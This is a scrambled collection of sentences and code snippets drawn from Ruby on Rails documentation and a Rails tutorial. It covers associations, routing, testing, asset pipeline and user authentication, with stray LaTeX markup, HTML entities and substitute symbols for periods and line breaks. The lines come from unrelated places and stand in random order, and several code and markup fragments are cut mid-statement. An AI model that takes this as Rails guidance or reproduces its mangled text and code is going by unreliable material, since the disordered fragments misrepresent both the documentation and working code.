If you use a graphical editor such as Sublime Text , TextMate , gVim , or MacVim , you need to use a flag to make sure that the editor stays attached to the shell instead of detaching immediately
( Note the \ kode { belongs \ _ to } line in Listing ~ \ ref { code : micropost _ user _ id _ validation } , which is generated automatically by the migration in Listing ~ \ ref { code : micropost _ migration } .
in Listing ~ \ ref { code : basic _ signup _ tests } .
This means we can use \ kode { following \ _ ids } by itself .
This object will be instantiated from the passed attributes , and the link through its foreign key will be set , but the associated object will _ not _ yet be saved .
If it does `ArgumentError` is raised .
use ActionDispatch : : Reloader
sunday
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we &apos;ll use the \ kode { authenticate } method to sign registered users into our site .
In the example above that &apos;s &quot; contributors &quot; .
# check &lt; tt &gt; collection ▖ length ▖ zero ? &lt; / tt &gt; .
( Not all of these rules apply to the Home page , but each rule here will be used at some point in the sample application ▖ )
# = &gt; { &quot; A &quot; = &gt; 1 }
with the ( slightly ) more expressive
The main body of the view will always render into the unnamed `yield` ▖
Most important of these are of course the controller , located at ╼ `app / controllers / welcome _ controller ▖ rb` and the view , located at ╼ `app / views / welcome / index ▖ html ▖ erb` .
# # # The `has _ one : through` Association
Note that we &apos;ve added \ kode { : password } and \ kode { : password \ _ confirmation } to the initialization hash for \ kode { User ▖ new } :
\ href { http : / / mbsy ▖ co / 6VQ8l } { Code School } : Interactive programming courses
In addition , off-the-shelf systems can be ``black boxes &apos; &apos; , with potentially mysterious innards ; when you write your own system , you are far more likely to understand it .
It &apos;s useful for examining , e ▖ g ▖ , the User model , but in this case we need to inspect \ kode { params } , which is not available in the web console as far as I can tell ▖ )
Luckily , Rails has already done the hardest part for us , because \ kode { rails generate controller } ( Listing ~ \ ref { code : generating _ pages } ) automatically generated a test file to get us started :
For example , `- &gt; { offset ( 11 ) } ` will skip the first 11 records .
# Returns a user &apos;s status feed .
Rails partials are used to place markup in a separate file for convenience .
╼ = &gt; nil
It may not function correctly ▖
You may see it referred to as ╼ &apos; inline JavaScript &apos; :
We &apos;re going to see the same generator that we used before when creating ╼ the `Article` model ▖
We &apos;ll uncomment those lines and write passing tests for account activation in Section ~ \ ref { sec : activation _ test _ and _ refactoring } .
NOTE : Because the router uses the HTTP verb and URL to match inbound requests , four URLs map to seven different actions .
It &apos;s best not to rely on that , though , so we &apos;ve taken the extra step and added an additional layer of security .
Since the emphasis in this book is on RSpec and Capybara , the presentation that follows is necessarily superficial and incomplete , and will be a bit light on explanation .
Create a select tag and a series of contained option tags for the provided object and method .
Implement a simplified version of this , restricting @ replies to appear only in the feeds of the recipient and the sender .
Filling in the information for the first signup .
Assets within an engine work in an identical way to a full application ▖
We &apos;ve achieved a lot already in this section , generating three valid pages using Rails controllers and actions , but they are purely static HTML and hence don &apos;t show off the power of Rails .
number _ to _ percentage ( 100 , precision : 0 ) # = &gt; 100 %
There &apos;s an additional complication , though : we expect to find the user by email address , which means we need its value in both the \ kode { edit } and \ kode { update } actions .
To write a test for a valid object , we &apos;ll create an initially valid User model object \ kode { @ user } using the special \ kode { setup } method ( discussed briefly in the Chapter ~ \ ref { cha : static _ pages } exercises ) , which automatically gets run before each test ▖ Because \ kode { @ user } is an instance variable , it &apos;s automatically available in all the tests , and we can test its validity using the \ kode { valid ? } \ method ( Section ~ \ ref { sec : creating _ user _ objects } ) .
I hope for both our sakes that it &apos;s the latter .
&lt; option value = &quot; 3 &quot; &gt; M ▖ Clark &lt; / option &gt;
= &gt; false
We &apos;ll define the generalized version of the \ kode { authenticated ? } \ method from Table ~ \ ref { table : password _ token _ digest } in Section ~ \ ref { sec : activating _ the _ account } .
Note the comment : this is not the final implementation .
&#124; GET &#124; / geocoder / new &#124; geocoders # new &#124; return an HTML form for creating the geocoder &#124;
Even better , we can configure Guard so that when , say , the \ kode { home ▖ html ▖ erb } file is modified , the \ kode { static \ _ pages \ _ controller \ _ test ▖ rb } automatically runs .
There is no step two !
It will also create the `search _ photos _ url` and `search _ photos _ path` route helpers .
The idea of the attack was to create a profile page named &quot; login _ home _ index _ html &quot; , so the URL looked very convincing ▖
The final piece of our password machinery is a method to retrieve users based on their email and passwords .
-----------------------------
gem &apos; coffee-rails &apos; , &apos; ~ &gt; 3 ▖ 1 ▖ 1&apos;
With a partial , you can move the code for rendering a particular piece of a response to its own file .
Besides these usual middleware , you can add your own by using the `config ▖ middleware ▖ use` method :
In terms of symbols as hash keys , we can define a \ kode { user } hash as follows :
would respond to the URL / users / tigers ( presumably to display all the tigers in our application )
This guide covers the configuration and initialization features available to Rails applications .
This pattern is true of every Ruby object : trace back the class hierarchy far enough and every class in Ruby ultimately inherits from \ kode { BasicObject } , which has no superclass itself .
Using \ kode { validates : uniqueness } does not guarantee uniqueness .
This makes the association indirectly , through a join model :
As a first step toward constructing a data model for following users , let &apos;s examine a typical case .
These methods should not be used in ordinary views ▖
config ▖ after _ initialize do
These steps are also available in individual release guides .
This will call `stylesheet _ path` internally and merge with your current host or your asset host .
The Users controller with a \ kode { show } action .
The call to \ kode { order } ensures that we find the first six users that were created .
{ &quot; a &quot; = &gt; 1 , a : 2 } ▖ symbolize _ keys
Incorporating \ kode { assert \ _ difference } into the file from Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } yields the test shown in Listing ~ \ ref { code : a _ test _ for _ valid _ submission } .
* `where`
* `disable _ dependency _ loading` Disables the automatic dependency loading if the `config ▖ eager _ load` is set to true .
# SELECT id FROM clients WHERE active = 1
They will automatically when the parent object is saved .
Possible values are ` : closure` , ` : uglifier` and ` : yui` which require the use of the `closure-compiler` , `uglifier` or `yui-compressor` gems respectively .
Person ▖ ids
As you proceed through the rest of the book , I recommend pushing and deploying the application regularly , which automatically makes remote backups and lets you catch any production errors as soon as possible .
To specify a dependency that should be installed with the engine during a ╼ traditional `gem install` , specify it inside the `Gem : : Specification` block ╼ inside the ` ▖ gemspec` file in the engine :
It &apos;s used in this example to ╼ display a small number next to each comment when it &apos;s created .
* `ActionDispatch : : RequestId` makes a unique X-Request-Id header available to the response and enables the `ActionDispatch : : Request # uuid` method .
As a result , Rails supports all four of the request types \ texttt { GET } , \ texttt { POST } , \ texttt { PATCH } , and \ texttt { DELETE } .
monday
Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in .
This is equivalent to visiting the signup page and submitting blank signup information ( which is invalid ) .
# Generates a datetime select that defaults to today ( no specified datetime )
Make a Contact page for the sample app .
In Section ~ \ ref { sec : requiring _ logged _ in _ users } , we &apos;ll handle the case of ╼ non-logged-in users who try to access a protected page to which they might normally have access .
As \ href { http : / / sivers ▖ org } { Derek Sivers } notes in the foreword , this book is structured as a linear narrative , designed to be read from start to finish .
There are two closely related subtleties left to address .
The resulting \ kode { &quot; delete &quot; } links will be displayed only if the current user is an admin ( Listing ~ \ ref { code : delete _ links } ) .
You can override the default column name if you need to :
&quot; 2010-07-27 &quot; ▖ to _ date # = &gt; Tue , 27 Jul 2010
The general subject is deep , but for the purposes of this tutorial we will need only a few of the most common Unix command-line commands , as summarized in Table ~ \ ref { table : unix _ commands } .
create app / assets / javascripts / welcome ▖ js ▖ coffee
Cucumber features are descriptions of expected behavior using a plain-text language called \ href { https : / / github ▖ com / cucumber / gherkin } { Gherkin } .
These are exactly the sorts of subtleties that benefit from test-driven development , so we &apos;ll write tests to catch the two errors before correcting them .
* * `ActionDispatch : : Reloader` * *
As noted in Section ~ \ ref { sec : adding _ to _ the _ layout } , many of these classes are specific to \ href { http : / / getbootstrap ▖ com / } { Bootstrap } , a framework from Twitter that makes it easy to add nice web design and user interface elements to an HTML5 application .
Adding a ``remember me &apos; &apos; checkbox to the login form .
now = DateTime ▖ now # = &gt; Mon , 07 Jun 2010 19 : 30 : 47 -0400
expires 1y ;
The About page at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / about } { / about } .
Fixing this blemish requires a significantly more complicated regular expression and is left as an exercise ( Section ~ \ ref { sec : modeling _ users _ exercises } ) ▖ )
Because the edit form is modifying an Active Record model object ( i ▖ e ▖ , a user ) , we can rely on the shared partial from Listing ~ \ ref { code : password _ reset _ form } to render error messages .
It also depends on how difficult the test is relative to the application code , how precisely the desired features are known , and how likely the feature is to break in the future .
The page to show a user ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ show _ user _ rails _ 3-full ▖ png } { ( full size ) }
The example used before was a controller called &quot; projects &quot; , which ╼ generated an `app / assets / javascripts / projects ▖ js ▖ coffee` and an ╼ `app / assets / stylesheets / projects ▖ css ▖ scss` file .
To insert something verbatim use the `raw` helper rather than calling `html _ safe` :
Here we &apos;ve also supplied the argument \ kode { password \ _ digest : string } with the name and type of attribute we want to create .
This hierarchy is illustrated in Figure ~ \ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } .
There is no default error message for `validates _ with` ▖
In order to make the necessary User model object , we could use Active Record to create a user with \ kode { User ▖ create } , but experience shows that user \ emph { factories } are a more convenient way to define user objects and insert them in the database .
As we &apos;ll see in Listing ~ \ ref { code : relationships _ controller } , enforcing access control on the Relationships controller actions won &apos;t much matter , but we &apos;ll still follow our previous practice of enforcing the security model as early as possible .
\ href { http : / / www ▖ gotealeaf ▖ com / railstutorial } { Tealeaf Academy } : A good online Rails development bootcamp ( includes advanced material )
In other words , the construction
( The first line here is just to make sure that you start on the master branch , so that the \ kode { modeling-users } topic branch is based on \ kode { master } .
# # # Choosing Between `belongs _ to` and `has _ one`
render inline : &quot; &lt; % products ▖ each do &#124; p &#124; % &gt; &lt; p &gt; &lt; % = p ▖ name % &gt; &lt; / p &gt; &lt; % end % &gt; &quot;
Because the application code was already working , this test should be \ passing :
email _ field _ tag &apos; email&apos;
This holds true even when you &apos;re pulling in a partial from another folder :
A mockup of the user edit page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / edit _ user _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Otherwise , you should run \ kode { heroku create } and then \ kode { git push heroku master } ▖ )
Unfortunately , it &apos;s also a cheat .
The line
Due to this , it makes sense to just have your ╼ controller tell the Mailer to send an email when a user is successfully created .
( We &apos;ll put this improved helper to use in Section ~ \ ref { sec : users _ index } ▖ )
def to _ check _ box _ tag ( options = { } , checked _ value = &quot; 1 &quot; , unchecked _ value = &quot; 0 &quot; )
The vertical bars around the variable name in ~ \ kode { &#124; i &#124; } are Ruby syntax for a block variable , and it &apos;s up to the method to know what to do with the block .
To facilitate the use of these parameters , it &apos;s conventional to introduce an auxiliary method called \ kode { user \ _ params } ( which returns an appropriate initialization hash ) and use it in place of \ kode { params &#91; : user &#93; } :
assemblies ▖ build ( attributes = { } , ▖ ▖ ▖ )
A before filter restricting the \ kode { destroy } action to admins .
If you use a hash-style `where` , then record creation via this association will be automatically scoped using the hash ▖
: formats = &gt; &#91; : html &#93; , : locale = &gt; &#91; : en , : en &#93; } ▖
In this chapter , we will begin developing the sample application that will serve as our example throughout the rest of this tutorial .
assert _ recognizes ( { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; } , &apos; / photos / 1 &apos; )
# = &gt; &#91; &#91; 1 , &apos; David &apos; &#93; , &#91; 2 , &apos; Jeremy &apos; &#93; , &#91; 3 , &apos; Jose &apos; &#93; &#93;
In particular , we can replace the code
* `ActionDispatch : : Cookies` sets cookies for the request .
Action Mailer allows for you to specify a `before _ action` , `after _ action` and ╼ `around _ action` .
Note that , for maximum flexibility , the \ kode { log \ _ in \ _ as } method in Listing ~ \ ref { code : test _ helper _ log _ in } accepts an \ kode { options } hash ( as in Listing ~ \ ref { code : gravatar _ option } ) , with default options for the password and for the ``remember me &apos; &apos; checkbox set to \ kode { &apos; password &apos; } and \ kode { &apos; 1&apos; } , respectively .
* Rails 4 ▖ 0 raises an `ArgumentError` if clashing named routes are defined ▖
The second feature of the asset pipeline is asset minification or compression ▖ ╼
When clicked , the link background will become red ▖
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; pending&apos;
shallow do
The log files on www ▖ attacker ▖ com will read like this :
Ruby is a big language , but fortunately the subset needed to be productive as a Rails developer is relatively small .
Let &apos;s see for example the definition of the `caches _ action` controller macro :
dup = array ▖ deep _ dup
Client ▖ select ( : id ) ▖ map { &#124; c &#124; c ▖ id }
Here &apos;s the problem : what ╼ happens when we have lots of JavaScript we want to execute on a click ?
The request to this asset is then served by the Sprockets gem .
For completeness , we &apos;ll add the Contact page , which was left as an exercise in Chapter ~ \ ref { cha : static _ pages } .
% w ( a b c d ) ▖ from ( 10 ) # = &gt; &#91; &#93;
Then commit the other changes to the main source code repository , push up to Bitbucket , and deploy to Heroku :
For a full list see the &#91; API documentation &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html )
For example here we get the correct jump in the calendar reform :
# # # Flash structure changes
The User model with an added \ kode { remember \ _ token } attribute .
For each of the selected users , we &apos;ll make 50 microposts ( plenty to overflow the pagination limit of ~ 30 ) .
Previous editions of this book used GitHub because of its emphasis on supporting open-source code , but growing concerns about security have led me to recommend that \ emph { all } web application repositories be private by default .
&lt; h1 &gt; Products &lt; / h1 &gt;
This is exactly the kind of situation where I like to write some tests first .
table _ name = class _ name ▖ to _ s ▖ demodulize ▖ underscore
# # # Updating the CHANGELOG
Environmental Security
A \ kode { Gemfile } for the toy app .
1234567890123 ▖ to _ s ( : human _ size ) # = &gt; 1 ▖ 12 TB
NOTE : Defined in `active _ support / core _ ext / kernel / singleton _ class ▖ rb` .
Even a single test requires the same Rails environment overhead , of course , which is why these commands are perfectly complemented by Spork : running a single test eliminates the overhead of running the entire test file , while running Spork eliminates the overhead of starting the test environment .
text _ field _ tag &apos; name&apos;
Verify that you have a ╼ current version of Ruby installed :
The computer doesn &apos;t care what the code looks like , of course , but humans do , so it is important to keep the code base clean by refactoring frequently .
# = &gt; Fri , 15 Oct 1582
create db / migrate / &#91; timestamp &#93; _ create _ blorgh _ comments ▖ rb
Returns an input tag of the &quot; password &quot; type tailored for accessing a specified attribute .
module ClassMethods
The way to create a file varies by system setup , but most text editors will let you control-click inside the directory where you want to create the file to bring up a menu with a ``New File &apos; &apos; menu item .
╼ ╼ \ subsection { A toy model for users } % ( fold ) ╼ \ label { sec : modeling _ demo _ users } ╼ ╼
number _ to _ human _ size ( 1234 ) # = &gt; 1 ▖ 2 KB
This corresponds to \ texttt { HTTP \ _ REFERER } , as defined by the specification for HTTP ▖ Note that ``referer &apos; &apos; is not a typo---the word is actually misspelled in the spec .
This method may be useful for example to easily accept both symbols and strings as options ▖
assert _ recognizes ( { controller : &apos; photos &apos; , action : &apos; create &apos; } , { path : &apos; photos &apos; , method : : post } )
In addition , when testing for user listings it would be convenient for them all to have different names .
This limit defaults to 5 and can be configured in `database ▖ yml` .
Account activation is now completed , which is a milestone worthy of a commit :
def index
Signup failure debug information ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4 _ debug-full ▖ png } { ( full size ) }
Create a micropost ( exception on failure ) .
As we will see , there is a problem with this approach , and we &apos;ll learn how to fix it using \ kode { has \ _ many through } .
The complete implementation for secure passwords ▖
Note that none of the methods above changes \ kode { a } itself .
created _ at : &quot; 2013-03-12 05 : 51 : 34 &quot; , updated _ at : &quot; 2013-03-12 05 : 51 : 34 &quot; ,
@ article = Article ▖ new ( params ▖ require ( : article ) ▖ permit ( : title , : text ) )
The syntax might look a little strange , but its effect is similar to variable assignment .
as shown in Listing ~ \ ref { code : protected _ index _ test } .
If you did not configure the ` : host` option globally make sure to pass it to ╼ `url _ for` .
Rendering nothing can be useful for Ajax requests where all you want to send back to the browser is an acknowledgment that the request was completed .
Then we &apos;ll make a listing of all users ( also requiring authorization ) , which will motivate the introduction of sample data and pagination .
See &#91; Asset ╼ Organization &#93; ( # asset-organization ) above for guidance on the correct locations ╼ for different file types .
If you need to use `return` statements in your callbacks , it is recommended that you explicitly define them as methods .
Experience shows that even fairly simple refactoring is error-prone and can easily go awry .
Following the template in Listing ~ \ ref { code : image _ upload _ test } , write a test of the image uploader in Section ~ \ ref { sec : micropost _ images } .
WARNING : Note that numbers are not mentioned ▖
This makes them ideal for use as hash keys .
In all of these cases , if you don &apos;t provide the leading host ( `http : / / www ▖ example ▖ com` ) , Rails will take those details from the current request .
The syntax for this introduces ╼ `require` and `permit` ▖
Technically , only the domain part of the email address is case-insensitive : \ emph { foo @ bar ▖ com } is actually different from \ emph { Foo @ bar ▖ com } .
SELECT * FROM clients WHERE ( clients ▖ id = 10 ) LIMIT 1
You can find additional resources about ( Rails ) security here :
class EmailValidator &lt; ActiveModel : : EachValidator
d ▖ next _ month # = &gt; Tue , 08 Jun 2010
A test for the Contact page ▖
This hash gets passed to the Users controller as part of \ kode { params } , and we saw starting in Section ~ \ ref { sec : a _ users _ resource } that the \ kode { params } hash contains information about each request ▖ In the case of a URL like / users / 1 , the value of \ kode { params &#91; : id &#93; } is the \ kode { id } of the corresponding user ( \ kode { 1 } ~ in this example ) .
It &apos;s best not to rely on that , though , so we &apos;ve taken the extra step and added an extra layer of security .
create _ table : patients do &#124; t &#124;
If all went well , you should run the full test suite to verify that all the tests are \ passing :
When writing applications using other programming languages or frameworks , it ╼ may be necessary to write a lot of configuration code ▖
But JavaScript has a handy eval ( ) function which executes any string as code .
as shown in Listing ~ \ ref { code : user _ following _ test } .
# # # Local Precompilation
We start with the page to show all the users in our application , called \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { \ texttt { index } } ; as you might expect , initially there are no users at all ( Figure ~ \ ref { fig : demo _ blank _ user _ index _ rails _ 3 } ) .
Extensions to `DateTime`
# becomes
# # # # # `group`
def some _ class _ method
╼ ╼ % subsection user _ index _ test ( end ) ╼ ╼ \ subsection { Partial refactoring } % ( fold ) ╼ \ label { sec : partial _ refactoring } ╼ ╼
Referring to the data model in Figure ~ \ ref { fig : user _ model _ password _ digest } , we see that this means creating a \ kode { password \ _ digest } attribute for the user fixture , which we &apos;ll accomplish by defining a \ kode { digest } method of our own .
# # # # Template Caching
In particular , the code above checks for the presence of a \ kode { &lt; title &gt; } tag containing the string ``Home &#124; Ruby on Rails Tutorial Sample App &apos; &apos; .
Testing the order of a user &apos;s microposts .
( A second option is to use \ kode { form \ _ tag } in place of \ kode { form \ _ for } ; this might be even more idiomatically correct Rails , but it has less in common with the signup form , and at this stage I want to emphasize the parallel structure .
It is also worth noting that older branches might have a different set of build targets than master ▖
What is Rails ?
We do this because Rails will pass all instance ╼ variables to the view .
* Adds support for &quot; Conditional `GET` &quot; so that server responds with nothing if page wasn &apos;t changed .
However , note that you don &apos;t need to use anchors because all routes are anchored at the start .
root &apos; welcome # index&apos;
This would be useful , for example , if you wanted to resume an interrupted batch process , provided you saved the last processed ID as a checkpoint .
This section covers how to ╼ mount the engine into an application and the initial setup required , as well as ╼ linking the engine to a `User` class provided by the application to provide ╼ ownership for articles and comments within the engine .
You can also tell Rails to render with no layout at all :
When a new micropost is made in this way , its \ kode { user \ _ id } is automatically set to the right value .
= &gt; &#91; &quot; a &quot; , &quot; b &quot; , &quot; c &quot; , &quot; d &quot; , &quot; e &quot; &#93;
t ▖ string : name
as shown in Listing ~ \ ref { code : about _ route } .
# # # Partials
You can override this view in the application by simply creating a new file at ╼ `app / views / blorgh / articles / index ▖ html ▖ erb` ▖
This object must have a `compress` method that takes a string as the sole ╼ argument and it must return a string .
# # # NumberHelper
* Downcases all words except acronyms .
TIP : If you want to see the exact results of a call to `render` without needing to inspect it in a browser , you can call `render _ to _ string` ▖
See &#91; this pull request &#93; ( https : / / github ▖ com / rails / rails / pull / 13271 ) for more ╼ details .
This does nothing but defer the real work to \ kode { follow } and \ kode { unfollow } partials , which need new routes for the Relationships resource , which follows the Microposts resource example ( Listing ~ \ ref { code : microposts _ resource } ) , as seen in Listing ~ \ ref { code : relationships _ resource } .
date ▖ since ( 1 ) # = &gt; Fri , 11 Jun 2010 00 : 00 : 01 EDT -04 : 00
route get &quot; static _ pages / home &quot;
# # # The Active Record Pattern
Here &apos;s what :
These labels then allow us to style the error messages with the SCSS shown in Listing ~ \ ref { code : error _ messages _ css } , which makes use of Sass &apos;s \ kode { @ extend } function to include the functionality of the Bootstrap class \ kode { has-error } .
prepared _ statements : false
The goal of this section is to start changing this sad state of affairs by producing the signup form mocked up in Figure ~ \ ref { fig : signup _ mockup } .
# Generates a time select that defaults to the time provided
which in Ruby 1 ▖ 8 returns ` &#91; nil &#93; ` for `nil` , and calls to `Array ( object ) ` otherwise ▖
/ logout
In this case , the partial will have access to a local variable `title` with the value &quot; Products Page &quot; .
create test / fixtures / users ▖ yml
* `ActiveRecord : : ConnectionAdapters : : ConnectionManagement` cleans active connections after each request , unless the `rack ▖ test` key in the request environment is set to `true` .
We tell Rails which processor to use using filename extensions ; the three most common cases are \ kode { ▖ scss } for Sass , \ kode { ▖ coffee } for CoffeeScript , and \ kode { ▖ erb } for embedded Ruby ( ERb ) .
To fix this , I am currently working with Nic and Wayne to create a list of Rails Installers ordered by Rails version number .
# # # `load`
( Procs are a somewhat advanced Ruby topic , so don &apos;t worry if they don &apos;t make sense right away ▖ )
You actually have a functional Rails application already ▖
The ` : association _ foreign _ key` option lets you set the name of the foreign key directly :
&lt; link href = &quot; / assets / application-4dd5b109ee3439da54f5bdfd78a80473 ▖ css &quot; media = &quot; screen &quot; ╼ rel = &quot; stylesheet &quot; / &gt;
while
╼ = &gt; &quot; production &quot;
# # # `Rails : : Railtie # initializer`
When it cannot get connection , a timeout ╼ error similar to given below will be thrown .
We can get the tests in Listing ~ \ ref { code : relationships _ access _ control } to pass by adding the \ kode { logged \ _ in \ _ user } before filter ( Listing ~ \ ref { code : relationships _ controller } ) .
Of course , you need to have rights ╼ to the view that you &apos;re using to render the content .
# environment
Account activation via the user model object .
The ` : controller` option lets you explicitly specify a controller to use for the resource ▖
Implementing the active relationships \ kode { has \ _ many } association .
To see the result , start a Rails development server as described in Section ~ \ ref { sec : rails _ server } :
Rails comes with built-in functions for defining associations between different data models .
ting tests are \ failing ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-d0d59d &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection partial _ refactoring ( end ) ╼ ╼ % section showing _ users ( end ) ╼ ╼ \ section { Deleting users } % ( fold ) ╼ \ label { sec : deleting _ users } ╼ ╼
If you want to be more specific and find all the clients with their age present in the database you can use `Client ▖ count ( : age ) ` .
page to edit user with id \ texttt { 1 }
Loading Spork ▖ prefork block ▖ ▖ .
User ▖ active ▖ merge ( User ▖ inactive )
/ signup
Here Rails knows to call the micropost partial because each element of \ kode { @ feed \ _ items } has class \ kode { Micropost } .
case role
This will route to the `Admin : : UserPermissions` controller .
# # # Clone the Rails Repository
&#91; 0 , true , String &#93; ▖ to _ param # = &gt; &quot; 0 / true / String &quot;
Singular forms are aliased so you are able to say :
The User model itself appears in Listing ~ \ ref { code : demo _ user _ model } ; although it is rather plain , it comes equipped with a large amount of functionality because of inheritance ( Section ~ \ ref { sec : inheritance _ hierarchies } and Section ~ \ ref { sec : ruby _ classes } ) .
This same information can be stored in a URL and provided via an environment variable like this :
t ▖ string : imageable _ type
\ label { table : static _ pages } } ╼ \ end { table } ╼ ╼ \ subsection { Testing titles ( Red ) } % ( fold ) ╼ \ label { sec : testing _ titles } ╼ ╼
( This uses the \ kode { touch } trick from Section ~ \ ref { sec : green } en route , but you can create the file however you like ▖ )
This is a problem , of course , because the code in Listing ~ \ ref { code : branch _ raise } is broken .
Let &apos;s run the test suite to verify that one test fails :
&#124; app / views / comments / &#124; Views of the controller are stored here &#124;
To get our application to display a custom Gravatar , we &apos;ll use \ kode { update \ _ attributes } ( Section ~ \ ref { sec : updating _ user _ objects } ) to change the user &apos;s email to something I control :
The \ kode { MicropostsController } class , highlighting inheritance .
The index action of your ╼ controller looks like this :
For ╼ example
To implement the forwarding behavior shown in Figure ~ \ ref { fig : signin _ page _ protected _ mockup _ bootstrap } , we &apos;ll use a \ emph { before filter } in the Users controller .
invoke resource _ route
Debug mode can also be enabled in Rails helper methods :
* Capitalizes the first word .
We &apos;ll then create our first Rails application , called \ kode { hello \ _ app } .
If you are serving assets directly from your Rails server in production , the ╼ best practice is to use a CDN in front of your application .
This gives us sufficient flexibility to change the random string if we ever need to .
It &apos;s also worth noting that the default Rails layout includes several additional lines :
As we have already seen , this calls ╼ the `show` action of the `ArticlesController` which in turn renders the ╼ `show ▖ html ▖ erb` template ▖
Testing the user / relationships \ kode { belongs \ _ to } association .
So a join between customer and order models will give the default join table name of &quot; customers _ orders &quot; because &quot; c &quot; outranks &quot; o &quot; in lexical ordering .
raise e unless e ▖ is _ missing ?
has _ many : assemblies , through : : manifests
Rails scaffolding is generated by passing the \ kode { scaffold } command to the \ kode { rails generate } script .
module ActionView
The main difference between the session form and the signup form is that we have no Session model , and hence no analogue for the \ kode { @ user } variable .
If ╼ there isn &apos;t an application handy to test this out in , generate one using the ╼ `rails new` command outside of the engine directory like this :
* `config ▖ action _ dispatch ▖ encrypted _ signed _ cookie _ salt` sets the signed ╼ encrypted cookies salt value ▖
42 files changed , 8461 insertions ( + ) , 0 deletions ( - )
d ▖ end _ of _ month # = &gt; Mon , 31 May 2010
You can also specify a second partial to be rendered between instances of the main partial by using the ` : spacer _ template` option :
The key is the \ emph { class } of the object---in this case , \ kode { User } .
This is why having \ emph { some } test of the view , even a minimalist one , is so important ▖ )
$ git remote add upstream https : / / github ▖ com / rails / rails ▖ git
We see from these conditions that we &apos;ll need an array of ids corresponding to the users being followed .
Temporary files
Like all other validations , `validates _ with` takes the ` : if` , ` : unless` and ╼ ` : on` options ▖
Returns a hidden input tag tailored for accessing a specified attribute .
Two new scrubbers have also been added : `PermitScrubber` and `TargetScrubber` .
Defaults to `true` ▖ ╼ ╼
To add a member route , just add a `member` block into the resource block :
module ArticlesHelper
This association indicates that the declaring model can be matched with zero or more instances of another model by proceeding _ through _ a third model ▖
Including the specific address that causes any failure is especially useful in a test with an \ kode { each } loop like Listing ~ \ ref { code : email _ format _ valid _ tests } ; otherwise , any failure would merely identify the line number , which is the same for all the email addresses , and which wouldn &apos;t be sufficient to identify the source of the problem .
= &gt; 0 ▖ ▖ 9
belongs _ to : client
# # # # div _ for
&#124; &#124; 406 &#124; : not _ acceptable &#124;
# = &gt; { &apos; 2009-032 &apos; = &gt; &lt; Invoice ▖ ▖ .
You can also remove the uniqueness constraint :
As noted in Section ~ \ ref { sec : the _ flash } , the flash HTML in Listing ~ \ ref { code : layout _ flash } is ugly .
A test of \ kode { dependent : : destroy } ▖
To prevent conflicts between Spring and Git when using Guard , you should add the \ kode { spring / } directory to the \ kode { ▖ gitignore } file used by Git to determine what to ignore when adding files or directories to the repository .
The application code will turn out to be relatively complicated , but we can write a ridiculously simple test for friendly forwarding just by reversing the order of logging in and visiting the edit page in Listing ~ \ ref { code : edit _ tests _ logged _ in } .
The default value is the uppercase ` : type` value , for example , &quot; ATOM &quot; or &quot; RSS &quot; .
invoke resource _ route
In Chapter ~ \ ref { cha : filling _ in _ the _ layout } , we &apos;ll start putting it to good use in developing the sample application .
Now you can draw unicode character routes directly ▖
We can see the result of all this work by signing up our first user under the name ``Rails Tutorial &apos; &apos; and email address ``example @ railstutorial ▖ org &apos; &apos; ( Figure ~ \ ref { fig : first _ signup } ) .
Note that we &apos;ve taken the opportunity to use a method reference for email downcasing as well .
admin ▖ validates : password , length : { minimum : 10 }
The next request to the ╼ CDN that comes in to the same URL will hit the cached copy ▖
With the form and its associated route defined , you will be able to fill in the ╼ form and then click the submit button to begin the process of creating a new ╼ article , so go ahead and do that ▖
* `Rack : : MethodOverride` allows the method to be overridden if `params &#91; : _ method &#93; ` is set ▖
Finally , for convenience the \ emph { Ruby on Rails Tutorial } adopts two conventions designed to make the many code samples easier to understand .
Once the block is done `atomic _ write` closes the file handle and completes its job .
In Rails , the default data structure for a data model is called , naturally enough , a ~ \ emph { model } ( the M in MVC from Section ~ \ ref { sec : mvc } ) .
Your exact results will differ in these details , but otherwise should essentially match the output shown above .
I urge you not to look too closely at the generated code ; at this stage , it will only serve to confuse you .
As seen in Listing ~ \ ref { code : name _ presence _ test } , all we need to do is set the \ kode { @ user } variable &apos;s \ kode { name } attribute to a blank string ( in this case , a string of spaces ) and then check ( using the \ kode { assert \ _ not } method ) that the resulting User object is not valid .
weeks _ ago
The same thing goes if you want to use a standard initializer .
C ▖ descendants # = &gt; &#91; &#93;
# app / controllers / users _ controller ▖ rb
# # # Inspecting Middleware Stack
Adding a status feed to the Home page .
url _ field _ tag &apos; url&apos;
The result appears in Figure ~ \ ref { fig : sqlite _ database _ browser } ) ; compare with the diagram in Figure ~ \ ref { fig : user _ model _ initial } .
SELECT &quot; articles &quot; ▖ &quot; id &quot; AS t0 _ r0 , ▖ ▖ ▖ &quot; comments &quot; ▖ &quot; updated _ at &quot; AS t1 _ r5 FROM &quot; articles &quot; LEFT OUTER JOIN &quot; comments &quot; ON &quot; comments &quot; ▖ &quot; article _ id &quot; = &quot; articles &quot; ▖ &quot; id &quot; WHERE ( comments ▖ visible = 1 )
in Listing ~ \ ref { code : preventing _ unactivated _ signins } .
The `collection &lt; &lt; ` method adds one or more objects to the collection by setting their foreign keys to the primary key of the calling model .
The HTML structure of a typical web page .
╼ ╼ \ end { aside } ╼ ╼ \ section { Introduction } % ( fold ) ╼ \ label { sec : introduction } ╼ ╼
$ cd actionmailer
If the user is authenticated , change the status from ``unactivated &apos; &apos; to ``activated &apos; &apos; .
It provides a more obvious alternative to calling `render : nothing` ▖
Date ▖ new ( 2010 , 4 , 30 ) ▖ months _ ago ( 2 ) # = &gt; Sun , 28 Feb 2010
